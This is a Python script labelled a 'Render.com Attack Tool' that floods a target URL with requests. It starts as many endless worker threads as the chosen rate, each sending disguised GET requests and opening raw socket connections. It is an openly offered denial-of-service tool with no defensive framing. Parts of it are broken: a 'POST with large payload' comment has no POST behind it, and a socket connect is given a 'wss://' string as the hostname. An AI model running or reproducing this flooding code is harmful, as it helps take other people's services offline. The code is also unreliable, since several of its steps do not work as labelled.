import requests
import socket
import time
import threading
import argparse
from concurrent.futures import ThreadPoolExecutor

class RenderAttack:
    def __init__(self, url, rate=100):
        self.url = url
        self.rate = rate
        self.interval = 1.0 / rate
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })
        
    def make_request(self):
        try:
            # Method 1: Normal GET requests
            start = time.time()
            response = self.session.get(self.url, timeout=5)
            elapsed = time.time() - start
            
            # Method 2: POST with large payload
            if elapsed < self.interval * 0.8:
                time.sleep(self.interval - elapsed)
                
            # Method 3: WebSocket connection
            ws = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ws.connect(('wss://' + self.url.replace('https://', '').split('/')[0], 443))
            ws.sendall(b'GET / HTTP/1.1\r\nHost: ' + self.url.encode() + b'\r\n\r\n')
            
            return response.status_code
        except Exception as e:
            return str(e)
    
    def start_attack(self):
        print(f"[*] Starting attack on {self.url} at {self.rate}/sec")
        
        def worker():
            while True:
                self.make_request()
        
        threads = []
        for _ in range(self.rate):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        
        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print("\n[*] Attack stopped")

def main():
    parser = argparse.ArgumentParser(description='Render.com Attack Tool')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-r', '--rate', type=int, default=100, help='Requests per second')
    args = parser.parse_args()
    
    attack = RenderAttack(args.url, args.rate)
    attack.start_attack()

if __name__ == "__main__":
    main()
